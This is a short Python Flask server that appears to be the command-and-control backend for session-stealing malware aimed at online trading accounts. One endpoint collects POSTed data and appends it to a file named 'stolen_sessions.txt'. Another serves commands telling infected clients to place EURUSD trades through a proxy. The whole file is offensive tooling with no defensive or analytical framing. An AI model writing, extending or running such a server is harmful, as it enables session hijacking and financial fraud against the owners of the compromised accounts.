import os
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/steal', methods=['POST'])
def steal_data():
    data = request.json
    print(f"[+] Received: {data}")
    with open("stolen_sessions.txt", "a") as f:
        f.write(f"{data}\n")
    return jsonify({"status": "success"}), 200

@app.route('/api/command', methods=['GET'])
def get_command():
    return jsonify({
        "proxy": "http://your-proxy-ip:port",
        "action": "open_trade",
        "asset": "EURUSD",
        "amount": 10,
        "direction": "up",
        "duration": 60
    }), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
